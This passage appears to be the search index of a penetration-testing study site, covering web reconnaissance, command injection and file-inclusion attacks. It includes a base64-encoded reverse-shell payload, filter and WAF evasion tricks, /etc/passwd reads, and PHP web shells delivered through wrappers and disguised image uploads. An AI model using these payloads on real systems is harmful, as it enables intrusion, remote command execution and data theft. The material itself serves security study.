$TARGET</code></p>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#whois_1","title":"WHOIS","text":"<p><code>whois 157.240.199.35</code></p>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#active-infrastructure-identification","title":"Active Infrastructure Identification","text":""},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#http-headers","title":"HTTP Headers","text":"<pre><code>curl -I \"http://${TARGET}\"\n</code></pre> <p>There are also other characteristics to take into account while fingerprinting web servers in the response headers. These are:</p> <ul> <li> <p>X-Powered-By header: This header can tell us what the web app is using. We can see values like PHP, ASP.NET, JSP, etc.</p> </li> <li> <p>Cookies: Cookies are another attractive value to look at as each technology by default has its cookies. Some of the default cookie values are:</p> <ul> <li>.NET: ASPSESSIONID= <li>PHP: PHPSESSID= <li>JAVA: JSESSION="},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#whatweb","title":"WhatWeb","text":"<pre><code>$ whatweb -a3 https://www.facebook.com -v\n</code></pre>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#wappalyzer","title":"Wappalyzer","text":""},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#wafw00f","title":"wafw00f","text":"<pre><code>$ pip3 install git+https://github.com/EnableSecurity/wafw00f\n$ wafw00f &lt;domain&gt;\n</code></pre>"},{"location":"zNew/Web/InformationGathering/WebInformationGathering/#subdomains","title":"Subdomains","text":"<pre><code>$ dnsenum --enum inlanefreight.com -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \n</code></pre>"},{"location":"zNew/Web/OWASP/CI/","title":"Command Injection(CI)","text":"<ul> <li>HackTricks</li> <li> <p>PayLoads</p> </li> <li> <p><code>echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi85OTk5IDA+JjEK|base64${IFS}-d |bash</code> Send the payload through CI</p> </li> </ul>"},{"location":"zNew/Web/OWASP/CI/#detection","title":"Detection","text":"<p>The process of detecting basic OS Command Injection vulnerabilities is the same process for exploiting such vulnerabilities. We attempt to append our command through various injection methods. If the command output changes from the intended usual result, we have successfully exploited the vulnerability.</p>"},{"location":"zNew/Web/OWASP/CI/#command-injection-methods","title":"Command Injection Methods","text":"<p>To inject an additional command to the intended one, we may use any of the following operators:</p> Injection Operator Injection Character URL-Encoded Character Executed Command Semicolon ; %3b Both New Line \\n %0a Both Background &amp; %26 Both (second output generally shown first) Pipe | %7c Both (only second output is shown) AND &amp;&amp; %26%26 Both (only if first succeeds) OR || %7c%7c Second (only if first fails) Sub-Shell `` %60%60 Both (Linux-only) Sub-Shell $() %24%28%29 Both (Linux-only)"},{"location":"zNew/Web/OWASP/CI/#bypassing-front-end-validation","title":"Bypassing Front-End Validation","text":"<p>The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application. To do so, we can start Burp Suite.</p>"},{"location":"zNew/Web/OWASP/CI/#identifying-filters","title":"Identifying Filters","text":""},{"location":"zNew/Web/OWASP/CI/#filterwaf-detection","title":"Filter/WAF Detection","text":"<p>This error message can be displayed in various ways. In this case, we see it in the field where the output is displayed, meaning that it was detected and prevented by the PHP web application itself. If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.</p>"},{"location":"zNew/Web/OWASP/CI/#blacklisted-characters","title":"Blacklisted Characters","text":"<p>A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request.  Let us reduce our request to one character at a time and see when it gets blocked</p>"},{"location":"zNew/Web/OWASP/CI/#bypassing-filters","title":"Bypassing Filters","text":""},{"location":"zNew/Web/OWASP/CI/#bypass-blacklisted-spaces","title":"Bypass Blacklisted Spaces","text":"<p>A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example. Still, there are many ways to add a space character without actually using the space character</p>"},{"location":"zNew/Web/OWASP/CI/#using-tabs","title":"Using Tabs","text":"<p>Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. So, let us try to use a tab instead of the space character (127.0.0.1%0a%09) and see if our request is accepted:</p>"},{"location":"zNew/Web/OWASP/CI/#using-ifs","title":"Using $IFS","text":"<p>Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use ${IFS} where the spaces should be, the variable should be automatically replaced with a space, and our command should work. Let us use ${IFS} and see if it works (127.0.0.1%0a${IFS}):</p>"},{"location":"zNew/Web/OWASP/CI/#using-brace-expansion","title":"Using Brace Expansion","text":"<p>There are many other methods we can utilize to bypass space filters. For example, we can use the Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces. Command arguments, like (127.0.0.1%0a{ls,-la}). To discover more space filter bypasses, check out the PayloadsAllTheThings page on writing commands without spaces.</p>"},{"location":"zNew/Web/OWASP/CI/#bypassing-other-blacklisted-characters","title":"Bypassing Other Blacklisted Characters","text":"<p>Besides injection operators and space characters, a very commonly blacklisted character is the slash (/) or backslash () character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.</p>"},{"location":"zNew/Web/OWASP/CI/#linux","title":"Linux","text":"<p>There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (or any other character) is through Linux Environment Variables like we did with ${IFS}. While ${IFS} is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify start and length of our string to exactly match this character.</p> <p>So, if we start at the 0 character, and only take a string of length 1, we will end up with only the / character, which we can use in our payload:</p> <pre><code>$ echo ${PATH:0:1}\n/\n</code></pre> <p>We can do the same with the $HOME or $PWD environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator</p> <pre><code>$ echo ${LS_COLORS:10:1} \n;\n</code></pre> <p>The printenv command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.</p> <pre><code>127.0.0.1${LS_COLORS:10:1}${IFS}\n${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt = /home/1nj3c70r/flag.txt\n</code></pre>"},{"location":"zNew/Web/OWASP/CI/#windows","title":"Windows","text":"<p>The same concept work on Windows as well. For example, to produce a slash in Windows Command Line (CMD), we can echo a Windows variable (%HOMEPATH% -&gt; \\Users\\htb-student), and then specify a starting position (~6 -&gt; \\htb-student), and finally specifying a negative end position, which in this case is the length of the username htb-student (-11 -&gt; ) :</p> <pre><code>&gt; echo %HOMEPATH:~6,-11%\n\\\n</code></pre> <p>We can achieve the same thing using the same variables in Windows PowerShell. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:</p> <pre><code>PS &gt; $env:HOMEPATH[0]\n\n\\\n</code></pre> <p>We can also use the Get-ChildItem Env: PowerShell command to print all environment variables and then pick one of them to produce a character we need. Try to be creative and find different commands to produce similar character</p>"},{"location":"zNew/Web/OWASP/CI/#character-shifting","title":"Character Shifting","text":"<p>There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with man ascii), then add it instead of [ in the below example. This way, the last printed character would be the one we need:</p> <pre><code>$ man ascii     # \\ is on 92, before it is [ on 91\n$ echo $(tr '!-}' '\"-~'&lt;&lt;&lt;[)\n\n\\\n</code></pre>"},{"location":"zNew/Web/OWASP/CI/#bypassing-blacklisted-commands","title":"Bypassing Blacklisted Commands","text":"<p>A command blacklist usually consists of a set of words, and if we can obfuscate our commands and make them look different, we may be able to bypass the filters.</p> <p>There are various methods of command obfuscation that vary in complexity, as we will touch upon later with command obfuscation tools. We will cover a few basic techniques that may enable us to change the look of our command to bypass filters manually.</p>"},{"location":"zNew/Web/OWASP/CI/#linux-windows","title":"Linux &amp; Windows","text":"<p>One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote ' and a double-quote \", in addition to a few others.</p> <p>The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the whoami command, we can insert single quotes between its characters, as follows:</p> <pre><code>w'h'o'am'i\nw\"h\"o\"am\"i\n</code></pre> <p>The important things to remember are that we cannot mix types of quotes and the number of quotes must be even. We can try one of the above in our payload (127.0.0.1%0aw'h'o'am'i).</p>"},{"location":"zNew/Web/OWASP/CI/#linux-only","title":"Linux Only","text":"<p>We can insert a few other Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command. These characters include the backslash \\ and the positional parameter character $@. This works exactly as it did with the quotes, but in this case, the number of characters do not have to be even, and we can insert just one of them if we want to:</p> <pre><code>who$@ami\nw\\ho\\am\\i\n</code></pre>"},{"location":"zNew/Web/OWASP/CI/#windows-only","title":"Windows Only","text":"<p>There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (^) character, as we can see in the following example:</p> <pre><code>&gt; who^ami\n</code></pre>"},{"location":"zNew/Web/OWASP/CI/#advanced-command-obfuscation","title":"Advanced Command Obfuscation","text":"<p>In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.</p>"},{"location":"zNew/Web/OWASP/CI/#case-manipulation","title":"Case Manipulation","text":"<p>One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. WHOAMI) or alternating between cases (e.g. WhOaMi). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.</p> <p>If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in.</p> <p>However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:</p> <pre><code>$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")\n$(a=\"WhOaMi\";printf %s \"${a,,}\")\n</code></pre> <p>Once we replace the spaces with tabs (%09), we see that the command works perfectly:</p>"},{"location":"zNew/Web/OWASP/CI/#reversed-commands","title":"Reversed Commands","text":"<p>Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing imaohw instead of whoami to avoid triggering the blacklisted command.</p> <p>We can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we'd have to get the reversed string of our command in our terminal, as follows:</p> <pre><code>$ echo 'whoami' | rev\n</code></pre> <p>Then, we can execute the original command by reversing it back in a sub-shell ($()), as follows:</p> <pre><code>$ $(rev&lt;&lt;&lt;'imaohw')\n</code></pre> <p>The same can be applied in Windows. We can first reverse a string, as follows:</p> <pre><code>PS &gt; \"whoami\"[-1..-20] -join ''\n</code></pre> <p>We can now use the below command to execute a reversed string with a PowerShell sub-shell (iex \"$()\"), as follows:</p> <pre><code>PS &gt; iex \"$('imaohw'[-1..-20] -join '')\"\n</code></pre>"},{"location":"zNew/Web/OWASP/CI/#encoded-commands","title":"Encoded Commands","text":"<p>The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique to each case, depending on what characters are allowed and the level of security on the server.</p> <p>We can utilize various encoding tools, like base64 (for b64 encoding) or xxd (for hex encoding). Let's take base64 as an example. First, we'll encode the payload we want to execute (which includes filtered characters):</p> <pre><code>$ echo -n 'cat /etc/passwd | grep 33' | base64\n</code></pre> <p>Now we can create a command that will decode the encoded string in a sub-shell ($()), and then pass it to bash to be executed (i.e. bash&lt;&lt;&lt;), as follows:</p> <pre><code>$ bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)\n</code></pre> <p><code>Tip: Note that we are using &lt;&lt;&lt; to avoid using a pipe |, which is a filtered character.</code></p> <p>Now we can use this command (once we replace the spaces) to execute the same command through command injection:</p> <p>Even if some commands were filtered, like bash or base64, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like sh for command execution and openssl for b64 decoding, or xxd for hex decoding.</p> <p>We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:</p> <pre><code>PS &gt; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))\n</code></pre> <p>We may also achieve the same thing on Linux, but we would have to convert the string from utf-8 to utf-16 before we base64 it, as follows:</p> <pre><code>$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64\n</code></pre> <p>Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (iex \"$()\"), as follows:</p> <pre><code>PS &gt; iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"\n</code></pre>"},{"location":"zNew/Web/OWASP/CI/#evasion-tools","title":"Evasion Tools","text":"<p>If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools. This section will discuss a couple of examples of these types of tools, one for Linux and another for Windows.</p>"},{"location":"zNew/Web/OWASP/CI/#linux-bashfuscator","title":"Linux (Bashfuscator)","text":"<p>A handy tool we can utilize for obfuscating bash commands is Bashfuscator. We can clone the repository from GitHub and then install its requirements, as follows:</p> <pre><code>$ git clone https://github.com/Bashfuscator/Bashfuscator\n$ cd Bashfuscator\n$ pip3 install setuptools==65\n$ python3 setup.py install --user\n\n$ ./bashfuscator -c 'cat /etc/passwd'\n</code></pre> <p>However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:</p> <pre><code>$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1\n</code></pre>"},{"location":"zNew/Web/OWASP/CI/#windows-dosfuscation","title":"Windows (DOSfuscation","text":"<p>There is also a very similar tool that we can use for Windows called DOSfuscation. Unlike Bashfuscator, this is an interactive tool, as we run it once and interact with it to get the desired obfuscated command. We can once again clone the tool from GitHub and then invoke it through PowerShell, as follows:</p> <pre><code>PS &gt; git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git\nPS &gt; cd Invoke-DOSfuscation\nPS &gt; Import-Module .\\Invoke-DOSfuscation.psd1\nPS &gt; Invoke-DOSfuscation\nInvoke-DOSfuscation&gt; SET COMMAND type C:\\Users\\htb-student\\Desktop\\flag.txt\nInvoke-DOSfuscation\\Encoding&gt; encoding\nInvoke-DOSfuscation\\Encoding&gt; 1\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/","title":"FILE INCLUSION(FI)","text":"<ul> <li>HackTricks</li> <li>Payloads</li> <li>PayLoads</li> </ul> <p>Many modern back-end languages use HTTP parameters to specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (LFI) vulnerability.</p> Function Read Content Execute Remote URL PHP include()/include_once() \u2705 \u2705 \u2705 require()/require_once() \u2705 \u2705 \u274c file_get_contents() \u2705 \u274c \u2705 fopen()/file() \u2705 \u274c \u274c NodeJS fs.readFile() \u2705 \u274c \u274c fs.sendFile() \u2705 \u274c \u274c res.render() \u2705 \u2705 \u274c Java include \u2705 \u274c \u274c import \u2705 \u2705 \u2705 .NET @Html.Partial() \u2705 \u274c \u274c @Html.RemotePartial() \u2705 \u274c \u2705 Response.WriteFile() \u2705 \u274c \u274c include \u2705 \u2705 \u2705"},{"location":"zNew/Web/OWASP/FI/#local-file-inclusion-lfi","title":"Local File Inclusion (LFI)","text":""},{"location":"zNew/Web/OWASP/FI/#basic-bypasses","title":"Basic Bypasses","text":""},{"location":"zNew/Web/OWASP/FI/#non-recursive-path-traversal-filters","title":"Non-Recursive Path Traversal Filters","text":"<p>One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals. </p> <p>If we use ....// as our payload, then the filter would remove ../ and the output string would be ../, which means we may still perform path traversal</p>"},{"location":"zNew/Web/OWASP/FI/#encoding","title":"Encoding","text":"<p>Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function.</p> <p>If the target web application did not allow . and / in our input, we can URL encode ../ into %2e%2e%2f, which may bypass the filter. To do so, we can use any online URL encoder utility or use the Burp Suite Decoder tool.</p>"},{"location":"zNew/Web/OWASP/FI/#approved-paths","title":"Approved Paths","text":"<p>Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. </p> <p>To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match. To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify.</p>"},{"location":"zNew/Web/OWASP/FI/#appended-extension","title":"Appended Extension","text":"<p>With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).</p> <p>There are a couple of other techniques we may use, but they are obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.</p>"},{"location":"zNew/Web/OWASP/FI/#path-truncation","title":"Path Truncation","text":"<p>In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).</p> <p>If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.</p> <pre><code>$ echo -n \"non_existing_directory/../../../etc/passwd/\" &amp;&amp; for i in {1..2048}; do echo -n \"./\"; done\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#null-bytes","title":"Null Bytes","text":"<p>PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.</p> <p>To exploit this vulnerability, we can end our payload with a null byte (e.g. /etc/passwd%00), such that the final path passed to include() would be (/etc/passwd%00.php). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.</p>"},{"location":"zNew/Web/OWASP/FI/#php-wrappers","title":"PHP Wrappers","text":"<p>We can use many methods to execute remote commands, each of which has a specific use case, as they depend on the back-end language/framework and the vulnerable function's capabilities. One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file like config.php, which may match a user's password in case they re-use the same password. Or we can check the .ssh directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (id_rsa) and use it to SSH into the system.</p> <p>Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications. We will build on what we learned in the previous section, and will utilize different PHP Wrappers to gain remote code execution</p>"},{"location":"zNew/Web/OWASP/FI/#php-filters","title":"PHP Filters","text":"<p>Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.</p>"},{"location":"zNew/Web/OWASP/FI/#input-filters","title":"Input Filters","text":"<p>PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.</p> <p>The filter wrapper has several parameters, but the main ones we require for our attack are resource and read. The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.</p> <p>There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.</p>"},{"location":"zNew/Web/OWASP/FI/#fuzzing-for-php-files","title":"Fuzzing for PHP Files","text":"<p>The first step would be to fuzz for different available PHP pages.</p> <pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php\n</code></pre> <p>Even after reading the sources of any identified files, we can scan them for other referenced PHP files, and then read those as well, until we are able to capture most of the web application's source or have an accurate image of what it does. It is also possible to start by reading index.php and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.</p>"},{"location":"zNew/Web/OWASP/FI/#source-code-disclosure","title":"Source Code Disclosure","text":"<p>Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the base64 PHP filter. Let's try to read the source code of config.php using the base64 filter, by specifying convert.base64-encode for the read parameter and config for the resource parameter, as follows:</p> <pre><code>php://filter/read=convert.base64-encode/resource=config\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#data","title":"Data","text":"<p>The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.</p>"},{"location":"zNew/Web/OWASP/FI/#checking-php-configurations","title":"Checking PHP Configurations","text":"<p>To do so, we can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it.</p> <pre><code>$ curl \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini\"\n</code></pre> <p>Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value:</p> <pre><code>$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#remote-code-execution","title":"Remote Code Execution","text":"<p>With allow_url_include enabled, we can proceed with our data wrapper attack. As mentioned earlier, the data wrapper can be used to include external data, including PHP code. We can also pass it base64 encoded strings with text/plain;base64, and it has the ability to decode them and execute the PHP code.</p> <p>So, our first step would be to base64 encode a basic PHP web shell, as follows:</p> <pre><code>$ echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' | base64\nPD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==\n</code></pre> <p>Now, we can URL encode the base64 string, and then pass it to the data wrapper with data://text/plain;base64,. Finally, we can use pass commands to the web shell with &amp;cmd=: <pre><code>$ curl -s 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id' | grep uid\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#input","title":"Input","text":"<p>Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentione</p> <p>To repeat our earlier attack but with the input wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:</p> <pre><code>$ curl -s -X POST --data '&lt;?php system($_GET[\"cmd\"]); ?&gt;' \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id\" | grep uid\n</code></pre> <p><code>Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. &lt;\\?php system('id')?&gt;)</code></p>"},{"location":"zNew/Web/OWASP/FI/#expect","title":"Expect","text":"<p>Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.</p> <p>However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following:</p> <pre><code>$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect\n</code></pre> <pre><code>$ curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id\"\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#file-uploads","title":"File Uploads","text":"<p>Image upload is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded. However, as discussed earlier, the vulnerability, in this case, is not in the file upload form but the file inclusion functionality.</p>"},{"location":"zNew/Web/OWASP/FI/#crafting-malicious-image","title":"Crafting Malicious Image","text":"<p>Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well. We can do so as follows:</p> <pre><code>$ echo 'GIF8&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.gif\n</code></pre> <p>This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.</p>"},{"location":"zNew/Web/OWASP/FI/#uploaded-file-path","title":"Uploaded File Path","text":"<p>Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL.</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#zip-upload","title":"Zip Upload","text":"<p>As mentioned earlier, the above technique is very reliable and should work in most cases and with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.</p> <p>We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named shell.jpg), as follows:</p> <pre><code>$ echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php\n</code></pre> <p>Once we upload the shell.jpg archive, we can include it with the zip wrapper as (zip://shell.jpg), and then refer to any files within it with #shell.php (URL encoded). Finally, we can execute commands as we always do with &amp;cmd=id, as follows:</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#phar-upload","title":"Phar Upload","text":"<p>Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:</p> <pre><code>&lt;?php\n$phar = new Phar('shell.phar');\n$phar-&gt;startBuffering();\n$phar-&gt;addFromString('shell.txt', '&lt;?php system($_GET[\"cmd\"]); ?&gt;');\n$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');\n\n$phar-&gt;stopBuffering();\n</code></pre> <p>This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:</p> <pre><code>$ php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg\n</code></pre> <p>Now, we should have a phar file called shell.jpg. Once we upload it to the web application, we can simply call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&amp;cmd=id), as follows:</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#remote-file-inclusion-rfi","title":"Remote File Inclusion (RFI)","text":"<p>in some cases, we may also be able to include remote files \"Remote File Inclusion (RFI)\", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:</p> <ul> <li>Enumerating local-only ports and web applications (i.e. SSRF)</li> <li>Gaining remote code execution by including a malicious script that we host</li> </ul>"},{"location":"zNew/Web/OWASP/FI/#verify-rfi","title":"Verify RFI","text":"<p>In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the allow_url_include setting to be enabled. We can check whether this setting is enabled through LFI.</p> <p>However, this may not always be reliable, as even if this setting is enabled, 